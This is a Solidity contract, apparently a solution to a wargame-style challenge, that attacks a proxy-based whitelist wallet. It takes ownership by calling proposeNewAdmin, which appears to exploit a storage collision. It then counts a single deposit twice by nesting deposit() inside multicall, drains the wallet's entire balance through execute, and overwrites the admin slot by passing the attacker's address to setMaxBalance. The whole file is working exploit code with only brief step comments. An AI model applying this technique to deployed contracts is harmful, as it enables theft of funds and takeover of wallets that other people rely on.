// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

interface IWallet {
    function balances(address) external view returns (uint256);

    function admin() external view returns (address);

    function proposeNewAdmin(address) external;

    function addToWhitelist(address) external;

    function deposit() external payable;

    function execute(
        address,
        uint256,
        bytes calldata
    ) external payable;

    function setMaxBalance(uint256) external;
}

contract ExclusivePass {
    receive() external payable {}

    function accessWallet(address instance) external payable {
        uint256 balance = instance.balance;
        uint256 value = msg.value;
        require(value >= balance, "Deposit instance balance at least");
        IWallet wallet = IWallet(instance);

        // grant `owner` role
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        wallet.addToWhitelist(instance);

        // deposit to use `execute()`
        wallet.deposit{value: value}();

        // prepare `deposit()` call (x2)
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSignature("deposit()");
        bytes memory depositWithMulticall = abi.encodeWithSignature(
            "multicall(bytes[])",
            depositData
        );

        // prepare `execute()` call
        uint256 targetAmount = instance.balance;
        bytes memory executeData = abi.encodeWithSignature(
            "execute(address,uint256,bytes)",
            address(this),
            targetAmount,
            ""
        );

        // prepare `multicall()` call
        bytes[] memory multicall = new bytes[](3);
        multicall[0] = depositWithMulticall;
        multicall[1] = depositWithMulticall;
        multicall[2] = executeData;
        bytes memory data = abi.encodeWithSignature(
            "multicall(bytes[])",
            multicall
        );

        // send tx and refund sender
        wallet.execute(instance, value, data);
        msg.sender.call{value: address(this).balance}("");

        // set admin
        wallet.setMaxBalance(uint160(msg.sender));
    }
}